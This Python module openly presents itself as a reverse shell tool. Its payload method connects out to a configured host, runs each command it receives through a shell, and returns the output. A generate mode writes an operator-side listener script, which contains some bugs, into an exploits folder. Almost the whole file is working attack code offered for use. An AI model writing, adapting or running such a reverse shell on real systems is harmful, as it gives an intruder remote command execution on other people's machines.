"""
Reverse Shell TCP Server Connection

This module provides a client-server connection for a reverse shell over TCP. It includes functions to generate a reverse shell exploit payload and start the client-side of the reverse shell.

Classes:
- ReverseShellTCPServerConnection: Manages the client-server connection for the reverse shell.

Usage:
1. Create an instance of the 'ReverseShellTCPServerConnection' class by providing the target IP and port as well as the local IP and port.
2. The 'generate_reverse_tcp_exploit' function generates a reverse shell exploit payload and saves it to a file.
3. The 'payload' function starts the client-side of the reverse shell, connecting to the server, receiving and executing commands, and sending back the results.

Note: Modify the code to adapt the target and local IP/port configurations for your specific use case.
"""

import os
import socket
import subprocess
from termcolor import colored
from abc import ABC, abstractmethod

class PayloadBase(ABC):

    @abstractmethod
    def payload(self):
        """ Abstarct method for payload server activation"""
        pass

class ReverseShellTCPServerConnection(PayloadBase):
    def __init__(self, target_host, target_port, local_host, local_port, mode):
        self.target_host = target_host
        self.target_port = target_port
        self.local_host = local_host
        self.local_port = local_port
        self.mode = mode

        if self.mode == "generate":
            self.generate_reverse_tcp_exploit()
        elif self.mode == "listener":
            self.payload()

    def generate_reverse_tcp_exploit(self):
        """
        Generate a reverse TCP exploit payload.

        This function creates an exploit payload for establishing a reverse TCP connection to a target IP and port. The target IP and port are displayed in a colored format for easy reference.

        Args:
            self (object): The instance of the class containing the target IP and port information.

        Returns:
            str: A string representing the reverse TCP exploit payload.
        """
        addr = colored(f'{self.target_host}:{self.target_port}', "yellow")
        code = f"""
import socket

def start_server(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(("{self.target_host}", "{self.target_port}"))
        server.listen(1)

        print(f'[+] Listening for incoming TCP connection on port')
        conn, addr = server.accept()
        print(f'[+] Listening for incoming TCP connection: {addr}')

        while True:
            command = input("Shell: ")

            if "terminate" in command:
                conn.send('terminate'.encode())
                conn.close()
                break
            else:
                conn.send(command.encode())
                print(conn.recv(1024).decode())

if __name__ == "__main__":
    start_server()

"""
        current_dir = os.getcwd()
        output_file = f"{current_dir}/exploits/rev_tcp.py"
        print(output_file)

        with open(output_file, "w") as file:
            file.write(code)
            print(f"Exploit code has been generated.")

    def payload(self):
        """
        Function to start the client-side of a reverse shell.

        This function connects to a remote server, receives and executes commands from the server, and sends back the results.

        Args:
            self (object): The instance of the class that includes local IP and port information.

        Returns:
            None
        """
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((self.local_host, self.local_port))

        while True:
            command = client.recv(1024).decode()

            if 'terminate' in command:
                client.close()
                break
            else:
                result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                client.send(result.stderr.read())
                client.send(result.stdout.read())


